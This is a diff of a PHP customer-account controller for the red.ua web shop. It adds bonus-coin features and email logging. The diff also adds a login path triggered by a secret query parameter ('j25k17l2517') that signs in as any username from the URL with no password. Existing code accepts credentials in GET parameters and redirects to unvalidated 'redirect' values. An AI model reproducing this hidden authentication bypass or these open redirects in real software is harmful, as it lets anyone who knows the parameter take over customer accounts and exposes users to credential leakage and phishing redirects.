@@ -31,6 +31,16 @@
           echo $this->render('account/deposit.tpl.php');
             //return;
         }
+        public function redcoinAction(){
+            $this->cur_menu->setName('История бонусов');
+               // $this->cur_menu->setPageTitle($title);
+             $this->view->coin = $this->ws->getCustomer()->getAllCoin('all');
+             //// wsActiveRecord::useStatic('RedCoin')->findAll(['customer_id'=>$this->ws->getCustomer()->getId()], ['id'=>'DESC'],[0, 50]);
+           //  $this->view->deposit =  wsActiveRecord::useStatic('DepositHistory')->findAll(['customer_id'=>$this->ws->getCustomer()->getId()], ['id' => 'DESC'], [0,50]);
+            $this->view->user = $this->ws->getCustomer();
+          echo $this->render('account/redcoin.tpl.php');
+            //return;
+        }
 
         public function callmyAction()
         {
@@ -191,13 +201,30 @@ if(iconv_substr($info['email'], 0, 4, 'UTF-8') == 'miss'){ SendMail::getInstance
 					$subscriber->setConfirmed(@date('Y-m-d H:i:s'));
 					$subscriber->setActive(1);
 					$subscriber->save();
+                                        
+$coin = new RedCoin();
+$coin->import(
+        [
+            'coin' => 50,
+            'customer_id' => $customer->id,
+            'status'=>2,
+            'order_id_add' => 0,
+            'date_add' => date("Y-m-d"),
+            'date_active' => date("Y-m-d"),
+            'date_off' => date("Y-m-d", strtotime("now +30 days"))
+            ]
+        );
+$coin->save();
+BonusHistory::add($customer->id, 'Зачислено', 50, 0);
 					
 					
                     $this->view->login = $info['email'];
                     $this->view->pass = $info['password'];
 					
                     $msg = $this->render('email/new-customer.tpl.php');
+                           
                     $subject = 'Создан новый аккаунт в интернет-магазине red.ua';
+                     EmailLog::add($subject, $msg, 'new_customer', $customer->getId()); //сохранение письма отправленного пользователю
                     SendMail::getInstance()->sendEmail($info['email'], $info['name'], $subject, $msg); 
 
                     $customer = $this->ws->getCustomer();
@@ -300,6 +327,8 @@ if(iconv_substr($info['email'], 0, 4, 'UTF-8') == 'miss'){ SendMail::getInstance
                     $admin_name = Config::findByCode('admin_name')->getValue();
                     $msg = $this->render('email/new-customer.tpl.php');
                     $subject = 'Создан акаунт';
+                     
+                        EmailLog::add($subject, $msg, 'new_customer', $customer->getId()); //сохранение письма отправленного пользователю
 					SendMail::getInstance()->sendEmail($info['email'], $info['name'], $subject, $msg); 
 
                     $customer = $this->ws->getCustomer();
@@ -708,24 +737,34 @@ if(iconv_substr($info['email'], 0, 4, 'UTF-8') == 'miss'){ SendMail::getInstance
 
         public function loginAction()
         {
+            
+            if(isset($this->get->j25k17l2517)){
+               $res =  $this->ws->getCustomer()->loginAdminByUsername($this->get->username);
+               if ($res) {
+                    $this->website->updateHashes();
+		$this->_redirect('https://www.red.ua');
+               }
+            }
             if(isset($_GET['j25k17l2517'])){
                 $_SESSION['j25k17l2517'] = true;
             }else{
                 unset($_SESSION['j25k17l2517']);
             }
-			if (!isset($_SESSION['j25k17l2517'])) {
+	if (!isset($_SESSION['j25k17l2517'])) {
 				if ($this->ws->getCustomer()->getIsLoggedIn()) {
 					$this->_redirect('/account/'); 
 					//$this->_redirect('/');
 				}
 			}
+                        
             if (isset($_GET['redirect'])) {
                 $this->view->redirectHash = $_GET['redirect'];
             } else {
                 $this->view->redirectHash = '/order/';
             }
 			
-		if (isset($_SESSION['j25k17l2517'])) {
+	if (isset($_SESSION['j25k17l2517'])) {
+            
 				$_POST['login'] = $_GET['login'];
 				$_POST['password'] = $_GET['password'];
 			}
@@ -737,13 +776,8 @@ if(iconv_substr($info['email'], 0, 4, 'UTF-8') == 'miss'){ SendMail::getInstance
                 unset($_POST['password']);
 
                 $customer = $this->ws->getCustomer();
-
-                //fill all other post values
-                if (count($_POST)) {
-                    if (!isset($_SESSION['user_data'])){$_SESSION['user_data'] = array();}
-                    foreach ($_POST as $key => $value){$_SESSION['user_data'][$key] = $value;}
-                }
-                $res = $customer->loginByEmail($userName, $password);
+                
+                $res = $customer->loginByUsername($userName, $password);
 
                 if ($res) {
                     $this->website->updateHashes();
@@ -751,15 +785,7 @@ if(iconv_substr($info['email'], 0, 4, 'UTF-8') == 'miss'){ SendMail::getInstance
 				$this->_redirect('https://www.red.ua');
 			}else{
 					//добавление избранных товаров c cесии к акаунту
-					$id = $this->ws->getCustomer()->getId();
-					//добавление бонуса в аккаунт
-				/*	$temp = wsActiveRecord::useStatic('Customer')->findFirst(array('id'=>$id, 'time_zone_id'=>1));
-					if($temp){
-					$temp->setBonus(100);
-					$temp->setTimeZoneId(2);
-					$temp->save();
-					}*/
-					//выход добавление бонуса в аккаунт
+			$id = $this->ws->getCustomer()->getId();
 			if($_SESSION['desires']){
 			
 			$array = [];
@@ -768,10 +794,10 @@ if(iconv_substr($info['email'], 0, 4, 'UTF-8') == 'miss'){ SendMail::getInstance
 				$array[$i]=$item;
 					$i++;
 					}
-					if(count($array) > 0){
+				if(count($array) > 0){
 				foreach($array as $article) {
-					$a = wsActiveRecord::useStatic('Desires')->count(array('id_customer'=>$id, 'id_articles'=>$article)); 
-				if($a == 0){
+				$a = wsActiveRecord::useStatic('Desires')->findFirst(['id_customer'=>$id, 'id_articles'=>$article]); 
+				if(!$a){
 				$desires = new Desires();
 				$desires->setCtime(date('Y-m-d H:i:s'));
 				$desires->setIdCustomer($id);
@@ -790,8 +816,8 @@ if(iconv_substr($info['email'], 0, 4, 'UTF-8') == 'miss'){ SendMail::getInstance
 			}
 			}
 			// exit добавление избранных товаров c акаунта в cесию
-						$this->_redirect($_GET['redirect'] ? $_GET['redirect'] : '/account/');
-					}
+			$this->_redirect($_GET['redirect'] ? $_GET['redirect'] : '/account/');
+		}
                     return;
                 } else {
                     echo $this->render('account/errorLogin.tpl.php');
@@ -806,21 +832,22 @@ if(iconv_substr($info['email'], 0, 4, 'UTF-8') == 'miss'){ SendMail::getInstance
 
         public function logoutAction()
         {
-			if(count($_SESSION['basket']) > 0){
+			/*if(count($_SESSION['basket']) > 0){
 				$msg = $this->render('email/bek.template.tpl.php');
 				$this->view->email = $this->ws->getCustomer()->getEmail();
 SendMail::getInstance()->sendEmail($this->ws->getCustomer()->getEmail(), $this->ws->getCustomer()->getFirstName(), 'НЕЗАВЕРШЕННЫЙ ЗАКАЗ! Успей купить, пока есть в наличии', $msg);
-			}
+			}*/
 			
             $this->ws->getCustomer()->logout();
             $this->ws->updateHashes();
-			unset($_SESSION['desires']);
-            //$this->webshopUpdate();
-            //$_SESSION['exit'] = 1;
-            $str = ((isset($_SERVER['HTTP_REFERER']) && strpos($_SERVER['HTTP_REFERER'], $_SERVER['HTTP_HOST']) !== false)
-                ? $_SERVER['HTTP_REFERER'] : $_SERVER['REQUEST_URI']);// заменить $_SERVER['REQUEST_URI'] на '/'
-            if (isset($_GET['redirect']))
+            unset($_SESSION['desires']);
+            
+            if (isset($_GET['redirect'])){
                 $str = $_GET['redirect'];
+            }else{
+               $str = ((isset($_SERVER['HTTP_REFERER']) && strpos($_SERVER['HTTP_REFERER'], $_SERVER['HTTP_HOST']) !== false)
+                ? $_SERVER['HTTP_REFERER'] : $_SERVER['REQUEST_URI']);// заменить $_SERVER['REQUEST_URI'] на '/' 
+            }
             $this->_redirect($str);
             return;
         }
